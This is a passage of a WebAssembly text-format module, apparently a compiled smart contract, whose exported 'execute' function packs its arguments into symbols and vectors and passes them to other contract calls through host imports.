(module
  (type (;0;) (func (param i32 i32 i32) (result i32)))
  (type (;1;) (func (param i32 i32) (result i32)))
  (type (;2;) (func (param i64 i64) (result i64)))
  (type (;3;) (func (param i64 i64 i64) (result i64)))
  (type (;4;) (func (result i64)))
  (type (;5;) (func (param i64) (result i64)))
  (type (;6;) (func (param i32 i32 i32 i32 i64)))
  (type (;7;) (func (param i32 i32 i32)))
  (type (;8;) (func (param i32 i32) (result i64)))
  (type (;9;) (func (param i64 i64 i64 i64 i64 i64 i64 i64) (result i64)))
  (type (;10;) (func (param i32 i64 i64 i64 i64 i64 i64 i64 i64)))
  (type (;11;) (func (param i32 i32 i32 i32 i32)))
  (type (;12;) (func (param i32 i64)))
  (type (;13;) (func (param i32)))
  (type (;14;) (func))
  (type (;15;) (func (param i32) (result i64)))
  (type (;16;) (func (param i32 i32 i32 i64)))
  (type (;17;) (func (param i32 i32 i32) (result i64)))
  (type (;18;) (func (param i32 i64 i32 i32) (result i64)))
  (type (;19;) (func (param i32 i64 i64 i64) (result i64)))
  (type (;20;) (func (param i32 i64 i64) (result i64)))
  (type (;21;) (func (param i32 i64) (result i64)))
  (type (;22;) (func (param i32 i32)))
  (type (;23;) (func (param i64) (result i32)))
  (type (;24;) (func (param i32 i64 i64)))
  (import "b" "j" (func (;0;) (type 2)))
  (import "v" "g" (func (;1;) (type 2)))
  (import "v" "h" (func (;2;) (type 3)))
  (import "x" "7" (func (;3;) (type 4)))
  (import "i" "6" (func (;4;) (type 2)))
  (import "i" "7" (func (;5;) (type 5)))
  (import "i" "8" (func (;6;) (type 5)))
  (import "d" "_" (func (;7;) (type 3)))
  (import "b" "8" (func (;8;) (type 5)))
  (table (;0;) 5 5 funcref)
  (memory (;0;) 17)
  (global (;0;) (mut i32) i32.const 1048576)
  (global (;1;) i32 i32.const 1049036)
  (global (;2;) i32 i32.const 1049040)
  (export "memory" (memory 0))
  (export "execute" (func 17))
  (export "_" (func 28))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2))
  (elem (;0;) (i32.const 1) func 14 26 60 59)
  (func (;9;) (type 6) (param i32 i32 i32 i32 i64)
    (local i32 i64 i64)
    global.get 0
    i32.const 48
    i32.sub
    local.tee 5
    global.set 0
    local.get 5
    local.get 1
    local.get 2
    i64.load
    local.get 3
    i64.load
    local.get 4
    call 40
    i64.store
    local.get 5
    i32.const 8
    i32.add
    local.get 1
    local.get 5
    call 10
    block ;; label = @1
      local.get 5
      i64.load offset=8
      i64.eqz
      br_if 0 (;@1;)
      i32.const 1048696
      i32.const 43
      local.get 5
      i32.const 8
      i32.add
      i32.const 1048680
      i32.const 1048664
      call 58
      unreachable
    end
    local.get 5
    i32.const 40
    i32.add
    i64.load
    local.set 4
    local.get 5
    i32.const 24
    i32.add
    i64.load
    local.set 6
    local.get 5
    i64.load offset=16
    local.set 7
    local.get 0
    local.get 5
    i64.load offset=32
    i64.store offset=16
    local.get 0
    local.get 6
    i64.store offset=8
    local.get 0
    local.get 7
    i64.store
    local.get 0
    i32.const 24
    i32.add
    local.get 4
    i64.store
    local.get 5
    i32.const 48
    i32.add
    global.set 0
  )
  (func (;10;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64 i64)
    global.get 0
    i32.const 48
    i32.sub
    local.tee 3
    global.set 0
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          local.get 2
          i64.load
          local.tee 4
          i64.const 255
          i64.and
          i64.const 75
          i64.ne
          br_if 0 (;@3;)
          i32.const 0
          local.set 2
          block ;; label = @4
            loop ;; label = @5
              local.get 2
              i32.const 16
              i32.eq
              br_if 1 (;@4;)
              local.get 3
              i32.const 8
              i32.add
              local.get 2
              i32.add
              i64.const 2
              i64.store
              local.get 2
              i32.const 8
              i32.add
              local.set 2
              br 0 (;@5;)
            end
          end
          local.get 1
          local.get 4
          local.get 3
          i32.const 8
          i32.add
          i32.const 2
          call 36
          drop
          local.get 3
          i32.const 24
          i32.add
          local.get 1
          local.get 3
          i32.const 8
          i32.add
          call 18
          local.get 3
          i64.load offset=24
          i64.const 0
          i64.ne
          br_if 1 (;@2;)
          local.get 3
          i32.const 24
          i32.add
          i32.const 16
          i32.add
          local.tee 2
          i64.load
          local.set 4
          local.get 3
          i64.load offset=32
          local.set 5
          local.get 3
          i32.const 24
          i32.add
          local.get 1
          local.get 3
          i32.const 16
          i32.add
          call 18
          block ;; label = @4
            local.get 3
            i64.load offset=24
            i64.eqz
            i32.eqz
            br_if 0 (;@4;)
            local.get 3
            i64.load offset=32
            local.set 6
            local.get 0
            i32.const 32
            i32.add
            local.get 2
            i64.load
            i64.store
            local.get 0
            local.get 6
            i64.store offset=24
            local.get 0
            i32.const 16
            i32.add
            local.get 4
            i64.store
            local.get 0
            local.get 5
            i64.store offset=8
            local.get 0
            i64.const 0
            i64.store
            br 3 (;@1;)
          end
          local.get 3
          i64.load offset=32
          local.set 4
          local.get 0
          i64.const 1
          i64.store
          local.get 0
          local.get 4
          i64.store offset=8
          br 2 (;@1;)
        end
        call 50
        local.set 4
        local.get 0
        i64.const 1
        i64.store
        local.get 0
        local.get 4
        i64.store offset=8
        br 1 (;@1;)
      end
      local.get 3
      i64.load offset=32
      local.set 4
      local.get 0
      i64.const 1
      i64.store
      local.get 0
      local.get 4
      i64.store offset=8
    end
    local.get 3
    i32.const 48
    i32.add
    global.set 0
  )
  (func (;11;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 48
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    i32.const 16
    i32.add
    local.get 1
    local.get 2
    call 19
    local.get 3
    i64.load offset=24
    local.set 4
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          local.get 3
          i32.load offset=16
          br_if 0 (;@3;)
          local.get 3
          local.get 1
          local.get 2
          i32.const 16
          i32.add
          call 19
          local.get 3
          i64.load offset=8
          local.set 5
          local.get 3
          i32.load
          i32.eqz
          br_if 1 (;@2;)
          local.get 5
          local.set 4
        end
        i64.const 1
        local.set 5
        br 1 (;@1;)
      end
      local.get 3
      local.get 5
      i64.store offset=40
      local.get 3
      local.get 4
      i64.store offset=32
      local.get 1
      local.get 3
      i32.const 32
      i32.add
      i32.const 2
      call 35
      local.set 4
      i64.const 0
      local.set 5
    end
    local.get 0
    local.get 4
    i64.store offset=8
    local.get 0
    local.get 5
    i64.store
    local.get 3
    i32.const 48
    i32.add
    global.set 0
  )
  (func (;12;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 39
    block ;; label = @1
      local.get 2
      i64.load
      i32.wrap_i64
      i32.eqz
      br_if 0 (;@1;)
      unreachable
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;13;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 11
    block ;; label = @1
      local.get 2
      i64.load
      i32.wrap_i64
      i32.eqz
      br_if 0 (;@1;)
      unreachable
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;14;) (type 1) (param i32 i32) (result i32)
    local.get 1
    i32.const 1048739
    i32.const 15
    call 62
  )
  (func (;15;) (type 9) (param i64 i64 i64 i64 i64 i64 i64 i64) (result i64)
    (local i32)
    global.get 0
    i32.const 240
    i32.sub
    local.tee 8
    global.set 0
    local.get 8
    local.get 1
    i64.store offset=152
    local.get 8
    local.get 0
    i64.store offset=144
    local.get 8
    local.get 2
    i64.store offset=160
    local.get 8
    local.get 3
    i64.store offset=168
    local.get 8
    local.get 4
    i64.store offset=176
    local.get 8
    local.get 5
    i64.store offset=184
    local.get 8
    local.get 6
    i64.store offset=192
    local.get 8
    i32.const 128
    i32.add
    local.get 8
    i32.const 239
    i32.add
    local.get 8
    i32.const 144
    i32.add
    call 37
    block ;; label = @1
      local.get 8
      i64.load offset=128
      i32.wrap_i64
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=136
      local.set 1
      local.get 8
      i32.const 112
      i32.add
      local.get 8
      i32.const 239
      i32.add
      local.get 8
      i32.const 152
      i32.add
      call 25
      local.get 8
      i64.load offset=112
      i32.wrap_i64
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=120
      local.set 0
      local.get 8
      i32.const 96
      i32.add
      local.get 8
      i32.const 239
      i32.add
      local.get 8
      i32.const 160
      i32.add
      call 37
      local.get 8
      i64.load offset=96
      i32.wrap_i64
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=104
      local.set 2
      local.get 8
      i32.const 80
      i32.add
      local.get 8
      i32.const 239
      i32.add
      local.get 8
      i32.const 168
      i32.add
      call 37
      local.get 8
      i64.load offset=80
      i32.wrap_i64
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=88
      local.set 3
      local.get 8
      i32.const 64
      i32.add
      local.get 8
      i32.const 239
      i32.add
      local.get 8
      i32.const 176
      i32.add
      call 37
      local.get 8
      i64.load offset=64
      i32.wrap_i64
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=72
      local.set 4
      local.get 8
      i32.const 48
      i32.add
      local.get 8
      i32.const 239
      i32.add
      local.get 8
      i32.const 184
      i32.add
      call 37
      local.get 8
      i64.load offset=48
      i32.wrap_i64
      br_if 0 (;@1;)
      local.get 8
      i64.load offset=56
      local.set 5
      local.get 8
      i32.const 32
      i32.add
      local.get 8
      i32.const 239
      i32.add
      local.get 8
      i32.const 192
      i32.add
      call 37
      local.get 8
      i64.load offset=32
      i32.wrap_i64
      br_if 0 (;@1;)
      local.get 7
      i64.const 255
      i64.and
      i64.const 75
      i64.ne
      br_if 0 (;@1;)
      local.get 8
      local.get 1
      local.get 0
      local.get 2
      local.get 3
      local.get 4
      local.get 5
      local.get 8
      i64.load offset=40
      local.get 7
      call 16
      local.get 8
      i32.const 200
      i32.add
      i32.const 24
      i32.add
      local.get 8
      i32.const 24
      i32.add
      i64.load
      i64.store
      local.get 8
      local.get 8
      i64.load offset=16
      i64.store offset=216
      local.get 8
      local.get 8
      i32.const 8
      i32.add
      i64.load
      i64.store offset=208
      local.get 8
      local.get 8
      i64.load
      i64.store offset=200
      local.get 8
      i32.const 239
      i32.add
      local.get 8
      i32.const 200
      i32.add
      call 13
      local.set 7
      local.get 8
      i32.const 240
      i32.add
      global.set 0
      local.get 7
      return
    end
    unreachable
    unreachable
  )
  (func (;16;) (type 10) (param i32 i64 i64 i64 i64 i64 i64 i64 i64)
    (local i32 i32 i32 i32 i32)
    global.get 0
    i32.const 256
    i32.sub
    local.tee 9
    global.set 0
    local.get 9
    local.get 3
    i64.store offset=40
    local.get 9
    local.get 2
    i64.store offset=32
    local.get 9
    local.get 4
    i64.store offset=48
    local.get 9
    local.get 5
    i64.store offset=56
    local.get 9
    local.get 6
    i64.store offset=64
    local.get 9
    local.get 7
    i64.store offset=72
    local.get 9
    local.get 9
    i32.const 255
    i32.add
    call 33
    i64.store offset=80
    local.get 9
    local.get 1
    i64.store offset=88
    local.get 9
    local.get 9
    i32.const 88
    i32.add
    i32.const 8
    i32.add
    local.tee 10
    i32.const 1048754
    i32.const 10
    call 38
    i64.store offset=216
    local.get 9
    i32.const 80
    i32.add
    local.get 10
    call 29
    local.set 3
    local.get 9
    i32.const 40
    i32.add
    local.get 10
    call 29
    local.set 2
    i32.const 1048800
    local.get 10
    call 32
    local.set 4
    i32.const 1048816
    local.get 10
    call 32
    local.set 5
    local.get 9
    i32.const 80
    i32.add
    local.get 10
    call 29
    local.set 6
    local.get 9
    i32.const 80
    i32.add
    local.get 10
    call 29
    local.set 7
    local.get 9
    i32.const 1048832
    local.get 10
    call 31
    i64.store offset=152
    local.get 9
    local.get 7
    i64.store offset=144
    local.get 9
    local.get 6
    i64.store offset=136
    local.get 9
    local.get 5
    i64.store offset=128
    local.get 9
    local.get 4
    i64.store offset=120
    local.get 9
    local.get 2
    i64.store offset=112
    local.get 9
    local.get 3
    i64.store offset=104
    i32.const 0
    local.set 11
    block ;; label = @1
      loop ;; label = @2
        local.get 11
        i32.const 56
        i32.eq
        br_if 1 (;@1;)
        local.get 9
        i32.const 160
        i32.add
        local.get 11
        i32.add
        i64.const 2
        i64.store
        local.get 11
        i32.const 8
        i32.add
        local.set 11
        br 0 (;@2;)
      end
    end
    local.get 9
    i32.const 224
    i32.add
    local.get 9
    i32.const 160
    i32.add
    local.get 9
    i32.const 160
    i32.add
    i32.const 56
    i32.add
    local.get 9
    i32.const 104
    i32.add
    local.get 9
    i32.const 104
    i32.add
    i32.const 56
    i32.add
    call 21
    i32.const 0
    local.get 9
    i32.load offset=244
    local.tee 11
    local.get 9
    i32.load offset=240
    local.tee 12
    i32.sub
    local.tee 13
    local.get 13
    local.get 11
    i32.gt_u
    select
    local.set 11
    local.get 9
    i32.load offset=224
    local.get 12
    i32.const 3
    i32.shl
    local.tee 13
    i32.add
    local.set 12
    local.get 9
    i32.load offset=232
    local.get 13
    i32.add
    local.set 13
    block ;; label = @1
      loop ;; label = @2
        local.get 11
        i32.eqz
        br_if 1 (;@1;)
        local.get 12
        local.get 13
        local.get 10
        call 30
        i64.store
        local.get 11
        i32.const -1
        i32.add
        local.set 11
        local.get 12
        i32.const 8
        i32.add
        local.set 12
        local.get 13
        i32.const 8
        i32.add
        local.set 13
        br 0 (;@2;)
      end
    end
    local.get 10
    local.get 9
    i32.const 88
    i32.add
    local.get 9
    i32.const 216
    i32.add
    local.get 10
    local.get 9
    i32.const 160
    i32.add
    i32.const 7
    call 35
    call 34
    local.get 9
    local.get 10
    local.get 9
    i32.const 32
    i32.add
    call 12
    i64.store offset=224
    local.get 9
    i64.const 2
    i64.store offset=104
    local.get 9
    i32.const 160
    i32.add
    local.get 9
    i32.const 104
    i32.add
    local.get 9
    i32.const 104
    i32.add
    i32.const 8
    i32.add
    local.get 9
    i32.const 224
    i32.add
    local.get 9
    i32.const 224
    i32.add
    i32.const 8
    i32.add
    call 21
    i32.const 0
    local.get 9
    i32.load offset=180
    local.tee 11
    local.get 9
    i32.load offset=176
    local.tee 12
    i32.sub
    local.tee 13
    local.get 13
    local.get 11
    i32.gt_u
    select
    local.set 11
    local.get 9
    i32.load offset=160
    local.get 12
    i32.const 3
    i32.shl
    local.tee 13
    i32.add
    local.set 12
    local.get 9
    i32.load offset=168
    local.get 13
    i32.add
    local.set 13
    block ;; label = @1
      loop ;; label = @2
        local.get 11
        i32.eqz
        br_if 1 (;@1;)
        local.get 12
        local.get 13
        local.get 10
        call 30
        i64.store
        local.get 11
        i32.const -1
        i32.add
        local.set 11
        local.get 12
        i32.const 8
        i32.add
        local.set 12
        local.get 13
        i32.const 8
        i32.add
        local.set 13
        br 0 (;@2;)
      end
    end
    local.get 10
    local.get 9
    i32.const 88
    i32.add
    i32.const 1048768
    local.get 10
    local.get 9
    i32.const 104
    i32.add
    i32.const 1
    call 35
    call 34
    local.get 9
    local.get 1
    i64.store offset=96
    local.get 9
    local.get 9
    i32.const 96
    i32.add
    i32.const 8
    i32.add
    local.tee 10
    i32.const 1048776
    i32.const 17
    call 38
    i64.store offset=216
    local.get 9
    i32.const 40
    i32.add
    local.get 10
    call 29
    local.set 1
    local.get 9
    i32.const 48
    i32.add
    local.get 10
    call 29
    local.set 3
    local.get 9
    i32.const 56
    i32.add
    local.get 10
    call 29
    local.set 2
    local.get 9
    i32.const 64
    i32.add
    local.get 10
    call 29
    local.set 4
    local.get 9
    i32.const 72
    i32.add
    local.get 10
    call 29
    local.set 5
    local.get 9
    local.get 8
    i64.store offset=144
    local.get 9
    local.get 5
    i64.store offset=136
    local.get 9
    local.get 4
    i64.store offset=128
    local.get 9
    local.get 2
    i64.store offset=120
    local.get 9
    local.get 3
    i64.store offset=112
    local.get 9
    local.get 1
    i64.store offset=104
    i32.const 0
    local.set 11
    block ;; label = @1
      loop ;; label = @2
        local.get 11
        i32.const 48
        i32.eq
        br_if 1 (;@1;)
        local.get 9
        i32.const 160
        i32.add
        local.get 11
        i32.add
        i64.const 2
        i64.store
        local.get 11
        i32.const 8
        i32.add
        local.set 11
        br 0 (;@2;)
      end
    end
    local.get 9
    i32.const 224
    i32.add
    local.get 9
    i32.const 160
    i32.add
    local.get 9
    i32.const 160
    i32.add
    i32.const 48
    i32.add
    local.get 9
    i32.const 104
    i32.add
    local.get 9
    i32.const 104
    i32.add
    i32.const 48
    i32.add
    call 21
    i32.const 0
    local.get 9
    i32.load offset=244
    local.tee 11
    local.get 9
    i32.load offset=240
    local.tee 12
    i32.sub
    local.tee 13
    local.get 13
    local.get 11
    i32.gt_u
    select
    local.set 11
    local.get 9
    i32.load offset=224
    local.get 12
    i32.const 3
    i32.shl
    local.tee 13
    i32.add
    local.set 12
    local.get 9
    i32.load offset=232
    local.get 13
    i32.add
    local.set 13
    block ;; label = @1
      loop ;; label = @2
        local.get 11
        i32.eqz
        br_if 1 (;@1;)
        local.get 12
        local.get 13
        local.get 10
        call 30
        i64.store
        local.get 11
        i32.const -1
        i32.add
        local.set 11
        local.get 12
        i32.const 8
        i32.add
        local.set 12
        local.get 13
        i32.const 8
        i32.add
        local.set 13
        br 0 (;@2;)
      end
    end
    local.get 9
    local.get 10
    local.get 9
    i32.const 96
    i32.add
    local.get 9
    i32.const 216
    i32.add
    local.get 10
    local.get 9
    i32.const 160
    i32.add
    i32.const 6
    call 35
    call 9
    local.get 9
    i32.const 24
    i32.add
    i64.load
    local.set 1
    local.get 9
    i32.const 8
    i32.add
    i64.load
    local.set 3
    local.get 9
    i64.load
    local.set 2
    local.get 0
    local.get 9
    i64.load offset=16
    i64.store offset=16
    local.get 0
    local.get 3
    i64.store offset=8
    local.get 0
    local.get 2
    i64.store
    local.get 0
    i32.const 24
    i32.add
    local.get 1
    i64.store
    local.get 9
    i32.const 256
    i32.add
    global.set 0
  )
  (func (;17;) (type 9) (param i64 i64 i64 i64 i64 i64 i64 i64) (result i64)
    local.get 0
    local.get 1
    local.get 2
    local.get 3
    local.get 4
    local.get 5
    local.get 6
    local.get 7
    call 15
  )
  (func (;18;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          local.get 2
          i64.load
          local.tee 4
          i32.wrap_i64
          i32.const 255
          i32.and
          local.tee 2
          i32.const 69
          i32.eq
          br_if 0 (;@3;)
          local.get 2
          i32.const 11
          i32.ne
          br_if 1 (;@2;)
          local.get 3
          local.get 4
          call 54
          local.get 3
          i64.load
          local.set 4
          local.get 0
          i32.const 16
          i32.add
          local.get 3
          i32.const 8
          i32.add
          i64.load
          i64.store
          local.get 0
          local.get 4
          i64.store offset=8
          i64.const 0
          local.set 4
          br 2 (;@1;)
        end
        local.get 1
        local.get 4
        call 47
        local.set 5
        local.get 1
        local.get 4
        call 46
        local.set 4
        local.get 0
        i32.const 16
        i32.add
        local.get 5
        i64.store
        local.get 0
        local.get 4
        i64.store offset=8
        i64.const 0
        local.set 4
        br 1 (;@1;)
      end
      local.get 0
      call 50
      i64.store offset=8
      i64.const 1
      local.set 4
    end
    local.get 0
    local.get 4
    i64.store
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;19;) (type 7) (param i32 i32 i32)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 1
    local.get 2
    call 20
    local.get 0
    local.get 3
    i64.load offset=8
    i64.store offset=8
    local.get 0
    i64.const 0
    i64.store
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;20;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i64.load
    local.tee 4
    local.get 2
    i32.const 8
    i32.add
    i64.load
    local.tee 5
    call 55
    block ;; label = @1
      block ;; label = @2
        local.get 3
        i64.load
        i32.wrap_i64
        br_if 0 (;@2;)
        local.get 3
        i64.load offset=8
        local.set 4
        br 1 (;@1;)
      end
      local.get 1
      local.get 5
      local.get 4
      call 45
      local.set 4
    end
    local.get 0
    local.get 4
    i64.store offset=8
    local.get 0
    i64.const 0
    i64.store
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;21;) (type 11) (param i32 i32 i32 i32 i32)
    local.get 0
    i32.const 0
    i32.store offset=16
    local.get 0
    local.get 4
    i32.store offset=12
    local.get 0
    local.get 3
    i32.store offset=8
    local.get 0
    local.get 2
    i32.store offset=4
    local.get 0
    local.get 1
    i32.store
    local.get 0
    local.get 2
    local.get 1
    i32.sub
    i32.const 3
    i32.shr_u
    local.tee 2
    i32.store offset=24
    local.get 0
    local.get 2
    local.get 4
    local.get 3
    i32.sub
    i32.const 3
    i32.shr_u
    local.tee 4
    local.get 2
    local.get 4
    i32.lt_u
    select
    i32.store offset=20
  )
  (func (;22;) (type 7) (param i32 i32 i32)
    (local i32 i64)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i64.load align=4
    i64.store offset=24 align=4
    local.get 3
    i32.const 8
    i32.add
    local.get 1
    local.get 3
    i32.const 24
    i32.add
    call 23
    local.get 3
    i64.load offset=8
    local.set 4
    local.get 0
    local.get 3
    i64.load offset=16
    i64.store offset=8
    local.get 0
    local.get 4
    i64.store
    local.get 3
    i32.const 32
    i32.add
    global.set 0
  )
  (func (;23;) (type 7) (param i32 i32 i32)
    (local i32 i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i32.load
    local.tee 4
    local.get 2
    i32.load offset=4
    local.tee 2
    call 51
    block ;; label = @1
      block ;; label = @2
        local.get 3
        i32.load
        br_if 0 (;@2;)
        local.get 3
        i64.load offset=8
        local.set 5
        br 1 (;@1;)
      end
      local.get 1
      local.get 4
      local.get 2
      call 41
      local.set 5
    end
    local.get 0
    local.get 5
    i64.store offset=8
    local.get 0
    i64.const 0
    i64.store
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;24;) (type 12) (param i32 i64)
    (local i32 i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 1
    i64.store offset=8
    local.get 2
    i32.const 16
    i32.add
    local.get 1
    call 49
    call 53
    local.set 3
    local.get 0
    local.get 2
    i64.load offset=8
    i64.store offset=8
    local.get 0
    local.get 3
    i32.const 32
    i32.ne
    i64.extend_i32_u
    i64.store
    local.get 2
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;25;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    block ;; label = @1
      block ;; label = @2
        local.get 2
        i64.load
        local.tee 4
        i64.const 255
        i64.and
        i64.const 72
        i64.eq
        br_if 0 (;@2;)
        i64.const 1
        local.set 4
        br 1 (;@1;)
      end
      local.get 3
      local.get 4
      call 24
      local.get 3
      i64.load offset=8
      local.set 5
      local.get 3
      i64.load
      local.set 4
    end
    local.get 0
    local.get 5
    i64.store offset=8
    local.get 0
    local.get 4
    i64.store
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;26;) (type 1) (param i32 i32) (result i32)
    local.get 1
    i32.const 1048895
    i32.const 15
    call 62
  )
  (func (;27;) (type 13) (param i32)
    unreachable
    unreachable
  )
  (func (;28;) (type 14))
  (func (;29;) (type 8) (param i32 i32) (result i64)
    local.get 0
    i64.load
  )
  (func (;30;) (type 8) (param i32 i32) (result i64)
    local.get 0
    i64.load
  )
  (func (;31;) (type 8) (param i32 i32) (result i64)
    local.get 0
    i64.load32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
  )
  (func (;32;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 1
    local.get 0
    call 19
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;33;) (type 15) (param i32) (result i64)
    local.get 0
    call 44
  )
  (func (;34;) (type 16) (param i32 i32 i32 i64)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 4
    global.set 0
    block ;; label = @1
      local.get 0
      local.get 1
      i64.load
      local.get 2
      i64.load
      local.get 3
      call 48
      i64.const 255
      i64.and
      i64.const 2
      i64.eq
      br_if 0 (;@1;)
      i32.const 1048852
      i32.const 43
      local.get 4
      i32.const 15
      i32.add
      i32.const 1048836
      i32.const 1049000
      call 58
      unreachable
    end
    local.get 4
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;35;) (type 17) (param i32 i32 i32) (result i64)
    local.get 0
    local.get 1
    local.get 2
    call 42
  )
  (func (;36;) (type 18) (param i32 i64 i32 i32) (result i64)
    local.get 0
    local.get 1
    local.get 2
    local.get 3
    call 43
  )
  (func (;37;) (type 7) (param i32 i32 i32)
    (local i64)
    local.get 0
    local.get 2
    i64.load
    local.tee 3
    i64.store offset=8
    local.get 0
    local.get 3
    i64.const 255
    i64.and
    i64.const 77
    i64.ne
    i64.extend_i32_u
    i64.store
  )
  (func (;38;) (type 17) (param i32 i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i32.store offset=28
    local.get 3
    local.get 1
    i32.store offset=24
    local.get 3
    i32.const 8
    i32.add
    local.get 0
    local.get 3
    i32.const 24
    i32.add
    call 22
    local.get 3
    i64.load offset=16
    local.set 4
    local.get 3
    i32.const 32
    i32.add
    global.set 0
    local.get 4
  )
  (func (;39;) (type 7) (param i32 i32 i32)
    local.get 0
    local.get 2
    i64.load
    i64.store offset=8
    local.get 0
    i64.const 0
    i64.store
  )
  (func (;40;) (type 19) (param i32 i64 i64 i64) (result i64)
    local.get 0
    local.get 1
    local.get 2
    local.get 3
    call 48
  )
  (func (;41;) (type 17) (param i32 i32 i32) (result i64)
    local.get 1
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 2
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 0
  )
  (func (;42;) (type 17) (param i32 i32 i32) (result i64)
    local.get 1
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 2
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 1
  )
  (func (;43;) (type 18) (param i32 i64 i32 i32) (result i64)
    local.get 1
    local.get 2
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 3
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 2
  )
  (func (;44;) (type 15) (param i32) (result i64)
    call 3
  )
  (func (;45;) (type 20) (param i32 i64 i64) (result i64)
    local.get 1
    local.get 2
    call 4
  )
  (func (;46;) (type 21) (param i32 i64) (result i64)
    local.get 1
    call 5
  )
  (func (;47;) (type 21) (param i32 i64) (result i64)
    local.get 1
    call 6
  )
  (func (;48;) (type 19) (param i32 i64 i64 i64) (result i64)
    local.get 1
    local.get 2
    local.get 3
    call 7
  )
  (func (;49;) (type 21) (param i32 i64) (result i64)
    local.get 1
    call 8
  )
  (func (;50;) (type 4) (result i64)
    i64.const 34359740419
  )
  (func (;51;) (type 7) (param i32 i32 i32)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    block ;; label = @1
      block ;; label = @2
        local.get 2
        i32.const 9
        i32.gt_u
        br_if 0 (;@2;)
        i64.const 0
        local.set 4
        loop ;; label = @3
          block ;; label = @4
            local.get 2
            br_if 0 (;@4;)
            local.get 0
            i32.const 0
            i32.store
            local.get 0
            local.get 4
            i64.const 8
            i64.shl
            i64.const 14
            i64.or
            i64.store offset=8
            br 3 (;@1;)
          end
          local.get 3
          i32.const 8
          i32.add
          local.get 1
          i32.load8_u
          call 52
          block ;; label = @4
            local.get 3
            i32.load8_u offset=8
            i32.const 3
            i32.eq
            br_if 0 (;@4;)
            local.get 0
            local.get 3
            i64.load offset=8
            i64.store offset=4 align=4
            local.get 0
            i32.const 1
            i32.store
            br 3 (;@1;)
          end
          local.get 1
          i32.const 1
          i32.add
          local.set 1
          local.get 2
          i32.const -1
          i32.add
          local.set 2
          local.get 4
          i64.const 6
          i64.shl
          local.get 3
          i64.load8_u offset=9
          i64.or
          local.set 4
          br 0 (;@3;)
        end
      end
      local.get 0
      local.get 2
      i32.store offset=8
      local.get 0
      i32.const 0
      i32.store8 offset=4
      local.get 0
      i32.const 1
      i32.store
    end
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;52;) (type 22) (param i32 i32)
    (local i32)
    i32.const 1
    local.set 2
    block ;; label = @1
      local.get 1
      i32.const 255
      i32.and
      i32.const 95
      i32.eq
      br_if 0 (;@1;)
      block ;; label = @2
        local.get 1
        i32.const -48
        i32.add
        i32.const 255
        i32.and
        i32.const 10
        i32.lt_u
        br_if 0 (;@2;)
        block ;; label = @3
          local.get 1
          i32.const -65
          i32.add
          i32.const 255
          i32.and
          i32.const 26
          i32.lt_u
          br_if 0 (;@3;)
          block ;; label = @4
            local.get 1
            i32.const -97
            i32.add
            i32.const 255
            i32.and
            i32.const 26
            i32.lt_u
            br_if 0 (;@4;)
            local.get 0
            local.get 1
            i32.store8 offset=1
            local.get 0
